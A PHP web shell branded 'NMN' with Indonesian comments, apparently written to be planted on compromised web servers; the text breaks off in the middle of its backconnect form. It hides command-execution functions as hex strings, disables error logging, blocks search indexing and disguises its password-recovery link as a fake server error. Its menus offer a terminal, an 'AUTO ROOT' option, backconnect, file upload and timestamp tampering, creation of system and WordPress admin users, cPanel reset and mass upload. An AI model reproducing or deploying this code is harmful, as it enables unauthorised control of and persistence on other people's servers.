<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

// Konfigurasi
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

// Konfigurasi password hash
$stored_hashed_password = '$2a$12$U6XzkKgz7X3Wv8BO0kq0nu2ouA5R23Ckql.rqczR/6Jp58FQPhMiS'; // qweqew

// Username dan password yang benar
$correct_username = 'Akagami768!!@@##$$##@@!!';

// Fungsi untuk menampilkan halaman login
function show_login_page() {
    ?>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Required</title>
    <style>
        body {
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #6e7dff, #2d67f0);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }

        .container {
            text-align: center;
            background-color: rgba(0, 0, 0, 0.6);
            padding: 40px;
            border-radius: 10px;
            width: 100%;
            max-width: 400px;
        }

        .login-title {
            font-size: 32px;
            margin-bottom: 30px;
            font-weight: bold;
            color: #fff;
            letter-spacing: 1px;
        }

        form {
            border: none;
            padding: 20px;
            background-color: transparent;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            box-sizing: border-box;
            font-size: 16px;
            background-color: #fff;
            color: #333;
            transition: all 0.3s ease;
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border: 1px solid #2d67f0;
            outline: none;
        }

        input[type="submit"] {
            width: 100%;
            padding: 12px 0;
            background-color: #2d67f0;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 18px;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #1a50b8;
        }

        .forgot-password {
            display: block;
            margin-top: 15px;
            color: #ccc;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password:hover {
            color: #fff;
        }

        @media (max-width: 600px) {
            .container {
                padding: 30px;
            }

            .login-title {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-title">ADMIN LOGIN</div>
        <form method="post">
            <input type="text" name="username" placeholder="Enter username" required>
            <input type="password" name="pass" placeholder="Enter password" required>
            <input type="submit" value="Login">
            <a href="?forgot_password=true" class="forgot-password">Forgot Password?</a>
        </form>
    </div>
</body>
</html>
    <?php
    exit;
}

// Fungsi Logout
if (isset($_GET['d']) && $_GET['d'] === 'logout') {
    session_unset();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']); // Redirect ke halaman login
    exit();
}

// Handle forgot password request and trigger 500 error
if (isset($_GET['forgot_password']) && $_GET['forgot_password'] === 'true') {
    // Trigger a 500 error with a custom styled page
    http_response_code(500);
    echo '<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .error-container {
            text-align: center;
            padding: 40px;
            background-color: #fff;
            border: 1px solid #ddd;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 60%;
            max-width: 600px;
        }
        .error-title {
            font-size: 48px;
            font-weight: bold;
            color: #e74c3c;
        }
        .error-message {
            font-size: 24px;
            color: #555;
            margin-top: 20px;
        }
        .error-footer {
            margin-top: 40px;
            font-size: 16px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <div class="error-title">500 Internal Server Error</div>
        <div class="error-message">Something went wrong. Please try again later.</div>
        <div class="error-footer">If the problem persists, contact support.</div>
    </div>
</body>
</html>';
    exit();
}

// Cek autentikasi
if (!isset($_SESSION['authenticated'])) {
    // Validasi input
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    $password = filter_input(INPUT_POST, 'pass', FILTER_SANITIZE_STRING);

    if ($username === $correct_username && $password && password_verify($password, $stored_hashed_password)) {
        // Prevent session fixation
        session_regenerate_id(true);
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}




// Kode PHP tambahan
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
# function WAF

$Array = [
    '676574637764', # ge  tcw d => 0
    '676c6f62', # gl ob => 1
    '69735f646972', # is_d ir => 2
    '69735f66696c65', # is_ file => 3
    '69735f7772697461626c65', # is_wr iteable => 4
    '69735f7265616461626c65', # is_re adble => 5
    '66696c657065726d73', # fileper ms => 6
    '66696c65', # f ile => 7
    '7068705f756e616d65', # php_unam e => 8
    '6765745f63757272656e745f75736572', # getc urrentuser => 9
    '68746d6c7370656369616c6368617273', # html special => 10
    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
    '6d6b646972', # mk dir => 12
    '746f756368', # to uch => 13
    '6368646972', # ch dir => 14
    '72656e616d65', # ren ame => 15
    '65786563', # exe c => 16
    '7061737374687275', # pas sthru => 17
    '73797374656d', # syst em => 18
    '7368656c6c5f65786563', # sh ell_exec => 19
    '706f70656e', # p open => 20
    '70636c6f7365', # pcl ose => 21
    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
    '70726f635f6f70656e', # p roc_open => 23
    '756e6c696e6b', # un link => 24
    '726d646972', # rmd ir => 25
    '666f70656e', # fop en => 26
    '66636c6f7365', # fcl ose => 27
    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
    '63686d6f64', # ch mod => 30
    '7379735f6765745f74656d705f646972', # temp _dir => 31
    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
    } elseif (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
    } elseif (mime_content_type($file) == 'text/javascript') {
        return '<i class="fa-brands fa-square-js"></i>';
    } elseif (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
    } elseif (mime_content_type($file) == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
    } elseif (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
    }
}

function download($file)
{

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if ($_GET['don'] == true) {
    $FilesDon = download(unx($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>NMN [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
    <style>
        @media screen and (min-width: 768px) and (max-width: 1200px) and (min-height:720px) {
            .code-editor-container {
                height: 85vh !important;
            }

            .CodeMirror {
                height: 72vh !important;
                font-size: xx-large !important;
                margin: 0 4px;
                border-radius: 4px;
            }

            .btn-modal-close {
                padding: 15px 40px !important;
            }
        }

        .btn-submit,
        a {
            text-decoration: none;
            color: #fff
        }

        a,
        body {
            color: #fff
        }

        .btn-submit,
        .form-file,
        tbody tr:nth-child(2n) {
            background-color: #000;
        }

        .code-editor,
        .modal,
        .terminal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0
        }

        .code-editor-body textarea,
        .terminal-body textarea {
            width: 98.5%;
            height: 400px;
            font-size: smaller;
            resize: none
        }

        .menu-tools li,
        .terminal-body li,
        .terminal-head li {
            display: inline-block
        }

        body {
    background-color: black;
	background-position: center;
    background-size: cover;
            font-family: monospace
        }

        .btn-modal-close:hover,
        .btn-submit:hover,
        .menu-file-manager ul,
        .path-pwd,
        thead {
             background-color: rgba(102, 0, 0, 0.5);
        }

        ul {
            list-style: none
        }

        .menu-header li {
            padding: 5px 0
        }

        .menu-header ul li {
            font-weight: 700;
            font-style: italic
        }

        .btn-submit {
            padding: 7px 25px;
            border: 2px solid red;
            border-radius: 4px
        }

        .form-file,
        a:hover {
            color: #fff
        }

        .btn-submit:hover {
            border: 2px solid #990000
        }

        .form-upload {
            margin: 10px 0
        }
		
		.file_url {
            background-color: #000; /* Red background */
            color: #fff; /* White text */
            border: 2px solid red;
            padding: 7px 20px;
            border-radius: 4px
}

        .form-file {
            border: 2px solid red;
            padding: 7px 20px;
            border-radius: 4px
        }

        .menu-tools {
            display: flex;
            justify-content: center; /* Meratakan secara horizontal */
        }
        .menu-tools ul {
            list-style-type: none;
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: center; /* Meratakan elemen di dalam ul */
            flex-wrap: wrap; /* Agar elemen yang panjang bisa turun ke baris berikutnya */
        }
        .menu-tools li {
            margin: 15px 5px; /* Jarak antara item */
        }

        .menu-file-manager,
        .modal-mail-text {
            margin: 10px 40px
        }

        .menu-file-manager li {
            display: inline-block;
            margin: 15px 20px
        }

        .menu-file-manager li a::after {
            content: "";
            display: block;
            border-bottom: 1px solid #fff
        }

        .path-pwd {
            padding: 15px 0;
            margin: 5px 0
        }

        table {
            border-radius: 5px
            width: 100%;
        }
        table {
            border: 2px solid red;
        }

        thead {
            height: 35px
        }

        tbody tr td {
            padding: 10px 0
        }

        tbody tr td:nth-child(2),
        tbody tr td:nth-child(3),
        tbody tr td:nth-child(4) {
            text-align: center
        }

        ::-webkit-scrollbar {
            width: 16px
        }

        ::-webkit-scrollbar-track {
            background: #000000
        }

        ::-webkit-scrollbar-thumb {
            background: #000000;
            border: 2px solid #555;
            border-radius: 4px
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #000000
        }

        ::-webkit-file-upload-button {
            display: none
        }

        .modal {
            display: none;
            z-index: 2;
            width: 100%;
            background-color: rgba(0, 0, 0, .3)
        }

        .modal-container {
            animation-name: modal-pop-out;
            animation-duration: .7s;
            animation-fill-mode: both;
            margin: 10% auto auto;
            border-radius: 10px;
            width: 800px;
            background-color: #660000
        }

        @keyframes modal-pop-out {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        .modal-header {
            color: #000;
            margin-left: 30px;
            padding: 10px
        }

.modal-body {
    max-height: 80vh; /* Limits the modal's height */
    overflow-y: auto; /* Adds vertical scrollbar if content overflows */
}

.modal-isi {
    padding: 10px; /* Adds padding inside the modal */
}

        .terminal-head li {
            color: #000
        }

        .modal-create-input {
    width: 700px;
    padding: 10px 5px;
    background-color: #000000;
    margin: 0 5%;
    border: none;
    border-radius: 4px;
    box-shadow: 8px 8px 20px rgba(0, 0, 0, .2);
    border-bottom: 2px solid #fff;
    color: #fff; /* Corrected property for text color */
}

        .box-shadow {
            box-shadow: 8px 8px 8px rgba(0, 0, 0, .2)
        }

        .btn-modal-close {
            background-color: #22242d;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 8px 35px
        }

        .badge-action-chmod:hover::after,
.badge-action-download:hover::after,
.badge-action-editor:hover::after,
.badge-action-touch:hover::after {
            padding: 5px;
            border-radius: 5px;
            margin-left: 110px;
            background-color: #2e313d
        }
		
.result-container {
    max-height: 300px; /* Adjust this value as needed */
    overflow-y: auto; /* Adds vertical scrollbar if content exceeds max-height */
    padding: 10px; /* Adds padding inside the result container */
    border: 1px solid #ddd; /* Optional: Adds a border for visual separation */
    background-color: #000; /* Optional: Background color */
}

/* Ensuring individual result lines are handled properly */
.result-line {
    white-space: nowrap; /* Prevents text from wrapping */
    overflow: hidden; /* Hides overflowed content */
    text-overflow: ellipsis; /* Adds "..." to indicate overflowed content */
    display: block;
    margin-bottom: 5px; /* Adds spacing between lines */
	color: #fff; /* Sets the text color to black */

}

        .result-link {
            color: #fffff* Link color */
            text-decoration: none; /* Remove underline from links */
        }

        .result-link:hover {
            text-decoration: underline; /* Add underline on hover */
        }

        .modal-btn-form {
            margin: 15px 0;
            padding: 10px;
            text-align: right
        }
 
        .file-size {
            color: orange
        }

        .badge-root::after {
            content: "root";
            display: block;
            position: absolute;
            width: 40px;
            text-align: center;
            margin-top: -30px;
            margin-left: 110px;
            border-radius: 4px;
            background-color: red
        }

        .badge-premium::after {
            content: "soon!";
            display: block;
            position: absolute;
            width: 40px;
            text-align: center;
            margin-top: -30px;
            margin-left: 140px;
            border-radius: 4px;
            background-color: red
        }

        .badge-action-chmod:hover::after,
.badge-action-download:hover::after,
.badge-action-editor:hover::after,
.badge-action-touch:hover::after,
        .badge-linux::after,
        .badge-windows::after {
            width: 60px;
            text-align: center;
            margin-top: -30px;
            display: block;
            position: absolute
        }

        .badge-windows::after {
            background-color: orange;
            color: #000;
            margin-left: 100px;
            border-radius: 4px;
            content: "windows"
        }

        .badge-linux::after {
            margin-left: 100px;
            border-radius: 4px;
            background-color: #0047a3;
            content: "linux"
        }

        .badge-action-editor:hover::after {
            content: "Rename"
        }

        .badge-action-chmod:hover::after {
            content: "Chmod"
        }
		
		.badge-action-touch:hover::after {
            content: "Change Time"
        }

        .badge-action-download:hover::after {
            content: "Download"
        }

        .CodeMirror {
            height: 70vh;
        }

        .code-editor,
        .terminal {
            background-color: rgba(0, 0, 0, .3);
            width: 100%
        }

        .code-editor-container {
            background-color: #660000;
            color: #0b0b0b;
            width: 90%;
            height: 90vh;
            margin: 20px auto auto;
            border-radius: 10px
        }

        .code-editor-head {
            padding: 15px;
            font-weight: 700
        }

        .terminal-container {
            animation: .5s both modal-pop-out;
            width: 90%;
            background-color: #660000;
            margin: 25px auto auto;
            color: #0b0b0b;
            border-radius: 4px
        }

        .bc-NMN,
        .mail,
        .terminal-input {
            background-color: #22242d;
            color: #fff
        }

        .terminal-head {
            padding: 8px
        }

        .terminal-head li a {
            color: #000;
            position: absolute;
            right: 0;
            margin-right: 110px;
            font-weight: 700;
            margin-top: -20px;
            font-size: 25px;
            padding: 1px 10px
        }

        .terminal-body textarea {
            margin: 4px;
            background-color: #22242d;
            color: #29db12;
            border-radius: 4px
        }

        .active {
            display: block
        }

        .terminal-input {
            width: 500px;
            padding: 6px;
            border: 1px solid #22242d;
            border-radius: 4px;
            margin: 5px 0
        }

        .bc-NMN {
            border: none;
            padding: 7px 10px;
            width: 712px;
            border-radius: 5px;
            margin: 15px 40px
        }

        .mail {
            width: 705px;
            resize: none;
            height: 100px
        }

        .logo-NMN {
            position: absolute;
            top: 0px;
            right: 40px;
            z-index: -1;
            bottom: 0
        }

        table tr {
            background-color: transparent;
            transition: background-color 0.3s ease;
        }

        table tr:hover {
    background-color: rgba(66, 1, 1, 0.7); /* #420101 with 70% opacity */
    color: #fff;
}


        .scrollable-box {
            max-height: 200px; /* Adjust height as needed */
            overflow-y: scroll;
            border: 1px solid #ccc;
            padding: 10px;
            background-color: #000; /* Black background */
            color: #fff; /* White text */
        }

        .scrollable-option {
            display: block;
            padding: 5px 0;
        }

        .scrollable-option input[type="checkbox"] {
            margin-right: 10px;
        }

        .result-link {
            color: #fff; /* Adjusted to a lighter shade of blue for better visibility on black background */
            text-decoration: underline;
        }
    </style>
</head>

<body>
    <div class="menu-header">
        <ul>
            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
            <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
            <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
            <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
            <li class="logo-NMN"><img width="300" height="300" src="https://i.ibb.co.com/YXmNkdh/20240911-200318.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="NMN-up-submit" class="btn-submit">&nbsp;<input type="file" name="NMN-upload" class="form-file"></li>
            </form>
			<form action="" method="post">
    <li class="form-upload">
        <input type="text" name="file_url" placeholder="Enter file URL" class="file_url">
        &nbsp;
        <input type="submit" value="Upload" name="upload-from-link" class="btn-submit">
    </li>
</form>
		</ul>
		<ul>
            <li><a href="" id="create_folder">+ Create Folder</a></li>
            <li><a href="" id="create_file">+ Create File</a></li>
        </ul>
    </div>
    <div class="menu-tools">
        <ul>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root"><i class="fa-solid fa-user-lock"></i> AUTO ROOT</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
<li><a href="" class="btn-submit badge-linux" id="lock-file"><i class="fa-brands fa-linux"></i> Lock File</a></li>
<li><a href="" class="btn-submit badge-root" id="root-user"><i class="fa-solid fa-user-plus"></i> Create User</a></li>
<li><a href="" class="btn-submit" id="create-rdp"><i class="fa-solid fa-laptop-file"></i> CREATE RDP</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> BACKCONNECT</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i class="fa-solid fa-unlock-keyhole"></i> UNLOCK SHELL</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> CPANEL RESET</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&massupload" class="btn-submit"><i class="fa-solid fa-upload"></i> MASS UPLOAD</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&shellscan" class="btn-submit"><i class="fa-solid fa-shield-alt"></i> SHELL SCAN</a></li>
<li><a href="?d=<?= hx($fungsi[0]()) ?>&randomupload" class="btn-submit"><i class="fa-solid fa-random"></i> REKOMENDASI UPLOAD</a></li>
<li><a href="?d=logout" class="btn-submit badge-logout"><i class="fa-solid fa-sign-out-alt"></i> LOGOUT</a></li>
        </ul>
    </div>

    <?php

    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
    $get_cwd = $fungsi[0]();
    ?>

    <div class="menu-file-manager">
        <div class="path-pwd">
            <?php
            $cwd = str_replace("\\","/", $get_cwd); // untuk dir garis windows
            $pwd = explode("/", $cwd);
            if (stristr(PHP_OS, "WIN")) {
                windowsDriver();
            }
            foreach ($pwd as $id => $val) {
                if ($val == '' && $id == 0) {
                    echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
                    continue;
                }
                if ($val == '') continue;
                echo '<a href="?d=';
                for ($i = 0; $i <= $id; $i++) {
                    echo hx($pwd[$i]);
                    if ($i != $id) echo hx("/");
                }
                echo '">' . $val . '/' . '</a>';
            }
            echo "   <a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>&nbsp;";
            ?>
        </div>
        </ul>
        <table style="width: 100%;">
            <thead>
                <tr>
                    <th>Name</th>
					<th>Create Time</th>
					<th>Modification time</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <form action="" method="post">
                <tbody>
                    <!-- NMN Folder File Manager -->
<?php foreach ($file_manager as $_D) : ?>
    <?php if ($fungsi[2]($_D)) : ?>
        <tr>
            <!-- Directory checkbox and name -->
            <td>
                <input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;
                <i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;
                <a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a>
            </td>

            <!-- Creation Time -->
            <td>
                <?php
                $createTime = file_exists($fungsi[0]() . '/' . $_D) ? date("Y-m-d H:i:s", filectime($fungsi[0]() . '/' . $_D)) : 'N/A';
                ?>
                <?= $createTime ?>
            </td>

            <!-- Modification Time -->
            <td>
                <?php
                $modTime = file_exists($fungsi[0]() . '/' . $_D) ? date("Y-m-d H:i:s", filemtime($fungsi[0]() . '/' . $_D)) : 'N/A';
                ?>
                <?= $modTime ?>
            </td>

            <!-- Directory Indicator -->
            <td>[ DIR ]</td>

            <!-- Directory Permissions -->
            <td style="text-align: center;">
                <?php
                $dirPath = $fungsi[0]() . '/' . $_D;
                if ($fungsi[4]($dirPath)) {
                    echo '<font color="#00ff00">';
                } elseif (!$fungsi[5]($dirPath)) {
                    echo '<font color="red">';
                }
                echo perms($dirPath);
                ?>
                                </td>
                                <!-- Action Folder Manager -->
                                <td style="text-align: center;">
    <!-- Link for renaming with current file path and identifier -->
    <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor">
        <i class="fa-solid fa-pen-to-square"></i>
    </a>&nbsp;

    <!-- Link for changing permissions (chmod) with current file path and identifier -->
    <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod">
        <i class="fa-solid fa-user-pen"></i>
    </a>&nbsp;

    <!-- Link for changing file timestamps (touch) with current file path and identifier -->
    <a href="?d=<?= hx($fungsi[0]()); ?>&touch=<?= hx($_D) ?>" class="badge-action-touch">
        <i class="fa-solid fa-clock"></i>
    </a>
</td>
								</tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- NMN Files Manager -->
<?php foreach ($file_manager as $_F) : ?>
    <?php if ($fungsi[3]($_F)) : ?>
        <tr>
            <!-- File checkbox and name -->
            <td>
                <input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;
                <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="NMN-files"><?= namaPanjang($_F); ?></a>
            </td>

            <!-- Creation Time -->
            <td>
                <?php
                $createTime = file_exists($_F) ? date("Y-m-d H:i:s", filectime($_F)) : 'N/A';
                ?>
                <?= $createTime ?>
            </td>
            
            <!-- Modification Time -->
            <td>
                <?php
                $modTime = file_exists($_F) ? date("Y-m-d H:i:s", filemtime($_F)) : 'N/A';
                ?>
                <?= $modTime ?>
            </td>

            <!-- File Size -->
            <td><?= formatSize(filesize($_F)); ?></td>

            <!-- File Permissions -->
            <td style="text-align: center;">
                <?php
                $filePath = $fungsi[0]() . '/' . $_F;
                if (is_writable($filePath)) {
                    echo '<font color="#00ff00">';
                } elseif (!is_readable($filePath)) {
                    echo '<font color="red">';
                }
                echo perms($filePath);
                ?>
                                </td>
                                <!-- Action File Manager -->
    <td style="text-align: center;">
    <!-- Link for renaming the file -->
    <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor">
        <i class="fa-solid fa-pen-to-square"></i>
    </a>&nbsp;

    <!-- Link for changing file permissions (chmod) -->
    <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod">
        <i class="fa-solid fa-user-pen"></i>
    </a>&nbsp;

    <!-- Link for downloading the file -->
    <a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download">
        <i class="fa-solid fa-download"></i>
    </a>&nbsp;

    <!-- Link for changing file timestamps (touch) -->
    <a href="?d=<?= hx($fungsi[0]()); ?>&touch=<?= hx($_F) ?>" class="badge-action-touch">
        <i class="fa-solid fa-clock"></i>
    </a>
</td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </tbody>
        </table>
        <br>
        <select name="NMN-select" class="btn-submit" style="background-color: #000; color: #fff;">
    <option value="delete">Delete</option>
    <option value="unzip">Unzip</option>
    <option value="zip">Zip</option>
</select>

        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">
        </form>
        <!-- Modal Pop Jquery Create Folder/File By Anomali7 -->
        <div class="modal">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">${this.title}</i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div id="modal-body-bc"></div>
                        <span id="modal-input"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    </div>
    </div>
    <?php if (isset($_GET['cpanelreset'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: Cpanel Reset </i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                                <input type="email" name="resetcp" class="modal-create-input" placeholder="Your email : example@mail.com">
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['createwp'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">
                                <center>CREATE WORDPRESS ADMIN PASSWORD</center>
                            </i></b></h3>
                </div>
                <form action="" method="post">
                    <div class="modal-body">
                        <div class="modal-isi">
                            <form action="" method="post">
                                <input type="text" name="db_name" class="modal-create-input" placeholder="DB_NAME">
                                <br><br>
                                <input type="text" name="db_user" class="modal-create-input" placeholder="DB_USER">
                                <br><br>
                                <input type="text" name="db_password" class="modal-create-input" placeholder="DB_PASSWORD">
                                <br><br>
                                <input type="text" name="db_host" class="modal-create-input" placeholder="DB_HOST" value="127.0.0.1">
                                <br><br>
                                <hr size="2" color="black" style="margin:0px 30px; border-radius:3px;">
                                <br><br>
                                <input type="text" name="wp_user" class="modal-create-input" placeholder="Your Username">
                                <br><br>
                                <input type="text" name="wp_pass" class="modal-create-input" placeholder="Your Password">
                                <br><br>
                        </div>
                        <div class="modal-btn-form">
                            <input type="submit" name="submitwp" value="Submit" class="btn-modal-close box-shadow">&nbsp;<a class="btn-modal-close box-shadow" href="?d=<?= hx($fungsi[0]()) ?>">Close</a>
                        </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">:: Backconnect</i></b></h3>
                </div>
                <form action="" method="post">
